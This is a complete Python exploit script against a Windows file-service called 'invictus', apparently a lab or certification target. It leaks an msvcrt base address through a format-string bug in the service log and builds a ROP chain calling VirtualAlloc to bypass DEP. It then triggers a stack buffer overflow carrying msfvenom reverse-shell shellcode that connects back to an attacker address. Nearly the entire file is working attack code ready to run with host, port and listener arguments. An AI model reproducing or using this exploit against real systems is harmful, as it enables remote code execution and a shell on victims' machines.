#!/usr/bin/env python3
import struct, sys, socket, time, re


def p(address):
    return struct.pack("<L", address)


def signature1():
    signature1 = 0x696E7669
    xor_key = 0x30383132

    return p(signature1 ^ xor_key)


def signature2():
    now = int(time.time())
    epoch = (now << 4) & 0xFFFFFFFF
    epoch = epoch | 0xFFFF0000
    epoch = epoch >> 8

    signature2 = 0x63747573
    xor_key = 0x30383132

    result = signature2 ^ xor_key
    result = result ^ epoch

    return p(result)


def checksum(buf):
    packet_length = len(buf)
    xor_key = 0x30383132

    result = packet_length ^ xor_key
    result = (result << 9) & 0xFFFFFFFF
    result = result * 0x10624DD3
    result = (result >> 32) & 0xFFFFFFFF
    result = result >> 6

    return result


def send(opcode, buf):
    host = sys.argv[1]
    port = int(sys.argv[2])

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    header = b""
    header += signature1()
    header += signature2()
    header += p(len(buf))
    header += p(opcode)
    header += p(checksum(buf))
    s.send(header + buf)

    res = s.recv(1024)
    s.close()

    return res


"""
Opcodes do write log messages to C:\\Windows\\Temp\\invictus_log.txt
opcode 0x800 reads file, wants File path as argument, vuln to buffer overflow due to reading file into fixed buffer of size 0x100
opcode 0x801 writes file, wants File path null terminated and content, writes content to log file, trunctates content buffer after 256 bytes
opcode 0x802 copies file, wants Src null terminated and destination, can copy from network share. Can copy more than 256 bytes to be used with BufferOverflow in read
opcode 0x803 Deletes file, can provide clean state
opcode 0x804 Reads Log, will add entry to log that log was read with content of log (logception)
opcode 0x805 Deletes log, will provide clean state
"""


# Helper function to see if a leaked address will be in one of the libraries. Address ranges will vary from reboot to reboot
def identify(address):
    ranges = [
        (0x820000, 0x833000),  # invictus
        (0x73690000, 0x736B8000),
        (0x73C60000, 0x73CB8000),
        (0x74B80000, 0x74C97000),
        (0x74CC0000, 0x74E98000),
        (0x75160000, 0x751A3000),
        (0x75510000, 0x75588000),
        (0x75590000, 0x7564D000),  # msvcrt
        (0x77520000, 0x775B5000),
        (0x77620000, 0x776E7000),
        (0x77770000, 0x777D6000),  # ws2_32
        (0x77880000, 0x77A10000),
    ]

    for r in ranges:
        if len(address) > 4:
            candidate = int(address, 16)
            if r[0] <= candidate <= r[1]:
                print(f"Match for {hex(candidate)}")


def leak():
    print("[*] Clearing log to start the exploit")
    # Delete log to start clean
    send(0x805, b"0")
    print("[*] Poisoning log file with '0x%x' * 12")
    # Write file to poison log
    send(
        0x801, b"C:\\Windows\\Temp\\file.txt\x00" + b"0x%%x" * 12
    )  # 4 will leak invictus and 12 will leak msvcrt
    # read log twice to retrieve the addresses
    print("[*] Reading log file once to process the format string")
    send(0x804, b"0")
    print("[*] Reading log a second time to leak addresses")
    res = send(0x804, b"0")
    pattern = r"(0x.*?)(?=(?:0x|$))"
    matches = re.findall(pattern, res.decode())
    # Choose 12 for msvcrt, index 12 will be the address msvcrt!_expandtime+0x250
    msvcrt_expandtime_250 = int(matches[12], 16)
    print(
        f"[+] Leaked address of msvcrt_expandtime+0x205: {hex(msvcrt_expandtime_250)}"
    )
    msvcrt_base = msvcrt_expandtime_250 - 0x89D61  # offset taken from windbg
    print(f"[+] Base address of msvcrt is: {hex(msvcrt_base)}")

    return msvcrt_base


def getRop(base):
    # GOALS Pushad chain
    # EDI[done] => Pointer to RET instruction
    # ESI[done] => jmp [eax] / ptr to VirtualAlloc
    # EBP[done] => push esp ; ret (jmp, call)
    # ESP[done] => leave as is
    # EBX[done] => dwSize
    # EDX[done] => flAllocationType
    # ECX[done] => flProtect
    # EAX[done] => ptr to VirtualAlloc / nops (offset to msvcrt +b61a8)

    # ESI affects ESI
    esi = p(base + 0x3B922)  # pop esi; ret
    esi += p(base + 0xD108)  # jmp [eax]

    # EDI affects EDI
    edi = p(base + 0x45D7E)  # pop esi; ret
    edi += p(base + 0x2862)  # ret;

    # EBP affects EBP
    ebp = p(base + 0x2F3A9)  # pop ebp; ret
    ebp += p(base + 0x96298)  # push esp; ret

    # EAX affects EAX
    eax = p(base + 0x3A532)  # pop eax; ret
    eax += p(base + 0xB61A8)  # ptr VirtualAlloc from IAT

    # EBX affects EBX, EAX
    ebx = p(base + 0x3A532)  # pop eax; ret
    ebx += p(0x1)  # 0x1
    ebx += p(base + 0x178B6)  # xchg ebx, eax; ret

    # EDX affects EDX, EAX, EBP
    edx = p(base + 0x3A532)  # pop eax; ret
    edx += b"A" * 0x10  # account for ret10 from ecx
    edx += p(0x1000)
    edx += p(base + 0x575C4)  # mov edx, eax; mov eax, ecx; pop ebp; ret;
    edx += b"A" * 4  # junk for ebp

    # ECX affects ECX, ESI, EAX
    ecx = p(base + 0x3A532)  # pop eax; ret
    ecx += p(0x40)
    ecx += p(base + 0x47A2D)  # mov ecx, eax; mov eax, esi; pop esi; ret 0x10;
    ecx += b"A" * 4  # junk for esi

    # PUSHAD
    pushad = p(base + 0xA8A54)  # pushad; ret

    rop = ecx + edx + ebx + esi + edi + ebp + eax + pushad
    return rop


def attack(base):
    # Construct payload
    print("[*] Generating payload")
    # 324 bytes -  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.152 LPORT=8080 -f python -v shellcode
    shellcode = b""
    shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
    shellcode += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
    shellcode += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
    shellcode += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
    shellcode += b"\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
    shellcode += b"\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
    shellcode += b"\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"
    shellcode += b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
    shellcode += b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
    shellcode += b"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
    shellcode += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
    shellcode += b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
    shellcode += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
    shellcode += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff"
    shellcode += b"\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
    shellcode += b"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40"
    shellcode += b"\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97"
    shellcode += b"\x6a\x05\x68\xc0\xa8\x2d\x98\x68\x02\x00\x1f"
    shellcode += b"\x90\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74"
    shellcode += b"\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75"
    shellcode += b"\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d"
    shellcode += b"\x64\x00\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12"
    shellcode += b"\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01"
    shellcode += b"\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
    shellcode += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc"
    shellcode += b"\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
    shellcode += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2"
    shellcode += b"\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
    shellcode += b"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f"
    shellcode += b"\x6a\x00\x53\xff\xd5"

    size = 2048
    offset = 284

    buf = b"A" * offset
    buf += getRop(base)
    buf += shellcode
    buf += b"D" * (size - len(buf))

    # Write Payload file to disk
    print("[*] Writing payload file to payload.txt")
    with open("payload.txt", "wb") as payload:
        payload.write(buf)

    payload.close()

    src_path = f"\\\\{sys.argv[3]}\\share\\payload.txt"
    # Copy file to target
    print("[*] Copy payload file to target")
    send(0x802, src_path.encode() + b"\x00C:\\Tools\\payload.txt")
    # Read back file to crash the service
    print("[*] Read payload file to trigger exploit")
    send(0x800, b"C:\\Tools\\payload.txt")


def main():
    """
    Attackplan
      - clear log to start from clean file
      - write file with content %x a bunch, so that content will reach log
      - read log once for 0x%x to get processed and filled with addresses
      - read log second time to retrieve the addresses
      - construct overflow payload and write to file
      - serve via smbserver.py
      - copy that file to target
      - read it back to crash the server
    """
    base = leak()
    attack(base)


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: exploit.py <host> <port> <lhost>")
        sys.exit(-1)

    main()
